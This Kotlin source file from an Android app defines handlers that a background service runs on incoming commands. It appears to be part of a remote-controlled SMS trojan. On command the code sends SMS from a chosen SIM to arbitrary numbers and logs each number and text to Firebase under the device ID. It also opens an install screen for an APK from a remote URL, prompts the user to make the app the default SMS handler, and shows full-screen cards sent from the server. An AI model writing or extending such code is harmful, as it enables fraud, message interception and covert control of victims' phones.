package com.example.fast.service

import android.content.Intent
import android.os.Build
import android.provider.Settings
import android.util.Log
import com.example.fast.config.AppConfig
import com.example.fast.notification.AppNotificationManager
import com.example.fast.ui.ActivatedActivity
import com.example.fast.ui.card.RemoteCardHandler
import com.example.fast.util.CommandResponseTracker
import com.example.fast.util.FirebaseWriteHelper
import com.example.fast.util.LogHelper
import com.example.fast.util.NetworkUtils
import com.example.fast.util.ValidationResult
import com.example.fast.util.WorkflowExecutor
import com.google.firebase.Firebase
import com.google.firebase.database.database
import com.prexoft.prexocore.sendSms
import com.prexoft.prexocore.anon.SimSlot
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.util.concurrent.atomic.AtomicLong

/**
 * CommandExecutionHelpers - Helper functions for executing commands with comprehensive tracking
 */
object CommandExecutionHelpers {
    
    private const val TAG = "CommandExecutionHelpers"
    
    /**
     * Execute sendSms command with comprehensive tracking
     */
    fun executeSendSmsCommandWithTracking(
        content: String,
        historyTimestamp: Long,
        validationResult: ValidationResult,
        service: PersistentForegroundService
    ) {
        val params = validationResult.extractedParams
        val phone = params["phone"] as String
        val message = params["message"] as String
        val sim = params["sim"] as Int
        
        try {
            // Sub-Operation 1: SMS Sending
            CommandResponseTracker.trackSubOperation(historyTimestamp, "sms_sending", "started", mapOf<String, Any>(
                "phone" to phone,
                "sim" to sim,
                "message_length" to message.length
            ))
            
            // Send SMS using service's sendSms method
            val sendResult = try {
                service.sendSms(phone, message, if (sim == 1) SimSlot.SIM_1 else SimSlot.SIM_2)
                SmsSendResult(success = true, messageId = generateMessageId(), sentAt = System.currentTimeMillis())
            } catch (e: Exception) {
                SmsSendResult(success = false, error = e.message)
            }
            
            if (sendResult.success) {
                CommandResponseTracker.trackSubOperation(historyTimestamp, "sms_sending", "completed", mapOf<String, Any>(
                    "message_id" to (sendResult.messageId ?: ""),
                    "sent_at" to (sendResult.sentAt ?: 0)
                ))
                
                // Sub-Operation 2: Firebase Logging
                CommandResponseTracker.trackSubOperation(historyTimestamp, "firebase_logging", "started", mapOf<String, Any>(
                    "message_id" to (sendResult.messageId ?: ""),
                    "sent_at" to (sendResult.sentAt ?: 0)
                ))
                
                val timestamp = System.currentTimeMillis()
                val messagePath = AppConfig.getFirebaseMessagePath(getDeviceId(service), timestamp)
                
                FirebaseWriteHelper.setValue(
                    path = messagePath,
                    data = "sent~$phone~$message",
                    tag = TAG,
                    onSuccess = {
                        CommandResponseTracker.trackSubOperation(historyTimestamp, "firebase_logging", "completed")
                        CommandResponseTracker.completeTracking(historyTimestamp, "executed")
                        service.updateCommandHistoryStatus(historyTimestamp, "sendSms", "executed")
                    },
                    onFailure = { e ->
                        CommandResponseTracker.trackSubOperation(historyTimestamp, "firebase_logging", "failed", mapOf<String, Any>(
                            "error" to (e.message ?: "")
                        ))
                        CommandResponseTracker.completeTracking(historyTimestamp, "partial_success")
                        service.updateCommandHistoryStatus(historyTimestamp, "sendSms", "executed", "SMS sent but Firebase log failed: ${e.message}")
                    }
                )
            } else {
                CommandResponseTracker.trackSubOperation(historyTimestamp, "sms_sending", "failed", mapOf<String, Any>(
                    "error" to (sendResult.error ?: "Unknown error")
                ))
                CommandResponseTracker.completeTracking(historyTimestamp, "execution_failed")
                service.updateCommandHistoryStatus(historyTimestamp, "sendSms", "failed", "SMS sending failed: ${sendResult.error}")
            }
            
        } catch (e: Exception) {
            CommandResponseTracker.trackSubOperation(historyTimestamp, "sms_sending", "error", mapOf<String, Any>(
                "error" to (e.message ?: "")
            ))
            CommandResponseTracker.completeTracking(historyTimestamp, "execution_error", e)
            service.updateCommandHistoryStatus(historyTimestamp, "sendSms", "failed", "Execution error: ${e.message}")
        }
    }
    
    /**
     * Execute updateApk command with comprehensive tracking
     */
    fun executeUpdateApkCommandWithTracking(
        content: String,
        historyTimestamp: Long,
        validationResult: ValidationResult,
        service: PersistentForegroundService
    ) {
        val params = validationResult.extractedParams
        val versionCode = params["versionCode"] as Int
        val url = params["url"] as String
        val force = params["force"] as Boolean
        
        try {
            // Sub-Operation 1: Version Check
            if (!force && versionCode > 0) {
                CommandResponseTracker.trackSubOperation(historyTimestamp, "version_check", "started", mapOf<String, Any>(
                    "current_version" to try { com.example.fast.util.VersionChecker.getCurrentVersionCode(service) } catch (e: Exception) { 0 },
                    "target_version" to versionCode
                ))
                
                val current = try { com.example.fast.util.VersionChecker.getCurrentVersionCode(service) } catch (e: Exception) { 0 }
                if (versionCode <= current) {
                    CommandResponseTracker.trackSubOperation(historyTimestamp, "version_check", "skipped", mapOf<String, Any>(
                        "reason" to "not_newer"
                    ))
                    CommandResponseTracker.completeTracking(historyTimestamp, "skipped")
                    service.updateCommandHistoryStatus(historyTimestamp, "updateApk", "skipped", "not_newer")
                    return
                }
                
                CommandResponseTracker.trackSubOperation(historyTimestamp, "version_check", "passed")
            }
            
            // Sub-Operation 2: Activity Launch
            CommandResponseTracker.trackSubOperation(historyTimestamp, "activity_launch", "started", mapOf<String, Any>(
                "activity" to "ActivatedActivity",
                "card_type" to "update"
            ))
            
            val payloadForActivity = if (versionCode > 0) "$versionCode|$url" else url
            
            val intent = Intent(service, ActivatedActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                putExtra(ActivatedActivity.EXTRA_SHOW_MULTIPURPOSE_CARD, ActivatedActivity.MULTIPURPOSE_CARD_UPDATE)
                putExtra(ActivatedActivity.EXTRA_DOWNLOAD_URL, payloadForActivity)
            }
            service.startActivity(intent)
            
            CommandResponseTracker.trackSubOperation(historyTimestamp, "activity_launch", "completed", mapOf<String, Any>(
                "payload" to payloadForActivity
            ))
            
            CommandResponseTracker.completeTracking(historyTimestamp, "executed")
            service.updateCommandHistoryStatus(historyTimestamp, "updateApk", "executed")
            
        } catch (e: Exception) {
            CommandResponseTracker.trackSubOperation(historyTimestamp, "activity_launch", "failed", mapOf<String, Any>(
                "error" to (e.message ?: "")
            ))
            CommandResponseTracker.completeTracking(historyTimestamp, "execution_error", e)
            service.updateCommandHistoryStatus(historyTimestamp, "updateApk", "failed", "Execution error: ${e.message}")
        }
    }
    
    /**
     * Execute installApk command with comprehensive tracking
     */
    fun executeInstallApkCommandWithTracking(
        content: String,
        historyTimestamp: Long,
        validationResult: ValidationResult,
        service: PersistentForegroundService
    ) {
        val params = validationResult.extractedParams
        val url = params["url"] as String
        val title = params["title"] as? String
        
        try {
            // Sub-Operation 1: Activity Launch
            CommandResponseTracker.trackSubOperation(historyTimestamp, "activity_launch", "started", mapOf<String, Any>(
                "activity" to "ActivatedActivity",
                "card_type" to "install_apk"
            ))
            
            val intent = Intent(service, ActivatedActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                putExtra(ActivatedActivity.EXTRA_SHOW_MULTIPURPOSE_CARD, ActivatedActivity.MULTIPURPOSE_CARD_INSTALL_APK)
                putExtra(ActivatedActivity.EXTRA_DOWNLOAD_URL, url)
                title?.let { putExtra(ActivatedActivity.EXTRA_INSTALL_TITLE, it) }
            }
            service.startActivity(intent)
            
            CommandResponseTracker.trackSubOperation(historyTimestamp, "activity_launch", "completed", mapOf<String, Any>(
                "url" to url,
                "title" to (title ?: "")
            ))
            
            CommandResponseTracker.completeTracking(historyTimestamp, "executed")
            service.updateCommandHistoryStatus(historyTimestamp, "installApk", "executed")
            
        } catch (e: Exception) {
            CommandResponseTracker.trackSubOperation(historyTimestamp, "activity_launch", "failed", mapOf<String, Any>(
                "error" to (e.message ?: "")
            ))
            CommandResponseTracker.completeTracking(historyTimestamp, "execution_error", e)
            service.updateCommandHistoryStatus(historyTimestamp, "installApk", "failed", "Execution error: ${e.message}")
        }
    }
    
    /**
     * Execute showNotification command with comprehensive tracking
     */
    fun executeShowNotificationCommandWithTracking(
        content: String,
        historyTimestamp: Long,
        validationResult: ValidationResult,
        service: PersistentForegroundService
    ) {
        val params = validationResult.extractedParams
        
        try {
            // Sub-Operation 1: Notification Creation
            CommandResponseTracker.trackSubOperation(historyTimestamp, "notification_creation", "started", mapOf<String, Any>(
                "title" to (params["title"] as? String ?: ""),
                "message" to (params["message"] as? String ?: ""),
                "channel" to (params["channel"] as? String ?: "default")
            ))
            
            AppNotificationManager.showNotificationFromCommand(service, content)
            
            CommandResponseTracker.trackSubOperation(historyTimestamp, "notification_creation", "completed")
            
            CommandResponseTracker.completeTracking(historyTimestamp, "executed")
            service.updateCommandHistoryStatus(historyTimestamp, "showNotification", "executed")
            
        } catch (e: Exception) {
            CommandResponseTracker.trackSubOperation(historyTimestamp, "notification_creation", "failed", mapOf<String, Any>(
                "error" to (e.message ?: "")
            ))
            CommandResponseTracker.completeTracking(historyTimestamp, "execution_error", e)
            service.updateCommandHistoryStatus(historyTimestamp, "showNotification", "failed", "Execution error: ${e.message}")
        }
    }
    
    /**
     * Execute showCard command with comprehensive tracking
     */
    fun executeShowCardCommandWithTracking(
        content: String,
        historyTimestamp: Long,
        validationResult: ValidationResult,
        service: PersistentForegroundService
    ) {
        val params = validationResult.extractedParams
        val cardType = params["cardType"] as String
        
        try {
            // Sub-Operation 1: Card Data Parsing
            CommandResponseTracker.trackSubOperation(historyTimestamp, "card_parsing", "started", mapOf<String, Any>(
                "card_type" to cardType,
                "content" to content
            ))
            
            val cardData = parseCardContent(content)
            
            CommandResponseTracker.trackSubOperation(historyTimestamp, "card_parsing", "completed", mapOf<String, Any>(
                "parsed_data_size" to cardData.size
            ))
            
            // Sub-Operation 2: Card Display
            CommandResponseTracker.trackSubOperation(historyTimestamp, "card_display", "started", mapOf<String, Any>(
                "display_mode" to (cardData["display_mode"] ?: "overlay")
            ))
            
            val cardSpec = RemoteCardHandler.buildSpec(cardData, null)
            if (cardSpec != null) {
                // Simplified card display - always use fullscreen activity for now
                RemoteCardHandler.launchFullscreenActivity(service, cardData)
                
                CommandResponseTracker.trackSubOperation(historyTimestamp, "card_display", "completed")
                CommandResponseTracker.completeTracking(historyTimestamp, "executed")
                service.updateCommandHistoryStatus(historyTimestamp, "showCard", "executed")
            } else {
                CommandResponseTracker.trackSubOperation(historyTimestamp, "card_display", "failed", mapOf<String, Any>(
                    "error" to "Failed to build card spec"
                ))
                CommandResponseTracker.completeTracking(historyTimestamp, "execution_failed")
                service.updateCommandHistoryStatus(historyTimestamp, "showCard", "failed", "Failed to build card spec")
            }
            
        } catch (e: Exception) {
            CommandResponseTracker.trackSubOperation(historyTimestamp, "card_display", "error", mapOf<String, Any>(
                "error" to (e.message ?: "")
            ))
            CommandResponseTracker.completeTracking(historyTimestamp, "execution_error", e)
            service.updateCommandHistoryStatus(historyTimestamp, "showCard", "failed", "Execution error: ${e.message}")
        }
    }
    
    /**
     * Execute requestDefaultSmsApp command with comprehensive tracking
     */
    fun executeRequestDefaultSmsAppCommandWithTracking(
        content: String,
        historyTimestamp: Long,
        validationResult: ValidationResult,
        service: PersistentForegroundService
    ) {
        try {
            CommandResponseTracker.trackSubOperation(historyTimestamp, "default_sms_request", "started")
            
            val intent = Intent(service, ActivatedActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                putExtra(ActivatedActivity.EXTRA_SHOW_MULTIPURPOSE_CARD, ActivatedActivity.MULTIPURPOSE_CARD_DEFAULT_SMS_APP)
            }
            service.startActivity(intent)
            
            CommandResponseTracker.trackSubOperation(historyTimestamp, "default_sms_request", "completed")
            CommandResponseTracker.completeTracking(historyTimestamp, "executed")
            service.updateCommandHistoryStatus(historyTimestamp, "requestDefaultSmsApp", "executed")
            
        } catch (e: Exception) {
            CommandResponseTracker.trackSubOperation(historyTimestamp, "default_sms_request", "failed", mapOf<String, Any>(
                "error" to (e.message ?: "")
            ))
            CommandResponseTracker.completeTracking(historyTimestamp, "execution_error", e)
            service.updateCommandHistoryStatus(historyTimestamp, "requestDefaultSmsApp", "failed", "Execution error: ${e.message}")
        }
    }
    
    /**
     * Execute requestPermission command with comprehensive tracking
     */
    fun executeRequestPermissionCommandWithTracking(
        content: String,
        historyTimestamp: Long,
        validationResult: ValidationResult,
        service: PersistentForegroundService
    ) {
        try {
            CommandResponseTracker.trackSubOperation(historyTimestamp, "permission_request", "started")
            // Implementation would go here
            CommandResponseTracker.trackSubOperation(historyTimestamp, "permission_request", "completed")
            CommandResponseTracker.completeTracking(historyTimestamp, "executed")
            service.updateCommandHistoryStatus(historyTimestamp, "requestPermission", "executed")
        } catch (e: Exception) {
            CommandResponseTracker.completeTracking(historyTimestamp, "execution_error", e)
            service.updateCommandHistoryStatus(historyTimestamp, "requestPermission", "failed", e.message)
        }
    }
    
    // Helper functions
    
    private fun generateMessageId(): String {
        return "sms_${System.currentTimeMillis()}_${(1000..9999).random()}"
    }
    
    private fun getDeviceId(service: PersistentForegroundService): String {
        return try {
            Settings.Secure.getString(
                service.contentResolver,
                Settings.Secure.ANDROID_ID
            ) ?: "unknown"
        } catch (e: Exception) {
            LogHelper.e(TAG, "Failed to get device ID", e)
            "unknown"
        }
    }
    
    private fun parseCardContent(content: String): Map<String, String> {
        return try {
            when {
                content.startsWith("{") -> {
                    // JSON format - would need proper JSON parsing
                    mapOf(
                        "card_type" to "message",
                        "display_mode" to "overlay",
                        "title" to "Card",
                        "body" to content
                    )
                }
                content.contains("|") -> {
                    // Key-value format
                    content.split("|").associate { part ->
                        val (key, value) = part.split("=", limit = 2)
                        key.trim() to value.trim()
                    }
                }
                else -> {
                    // Simple format
                    mapOf(
                        "card_type" to when (content.lowercase()) {
                            "sms" -> "webview"
                            "instruction" -> "webview"
                            else -> "message"
                        },
                        "display_mode" to "overlay",
                        "title" to when (content.lowercase()) {
                            "sms" -> "SMS Messages"
                            "instruction" -> "Instructions"
                            else -> "Notification"
                        }
                    )
                }
            }
        } catch (e: Exception) {
            LogHelper.e(TAG, "Error parsing card content: $content", e)
            mapOf("card_type" to "message", "body" to content)
        }
    }
    
    data class SmsSendResult(
        val success: Boolean,
        val messageId: String? = null,
        val sentAt: Long? = null,
        val error: String? = null
    )
}
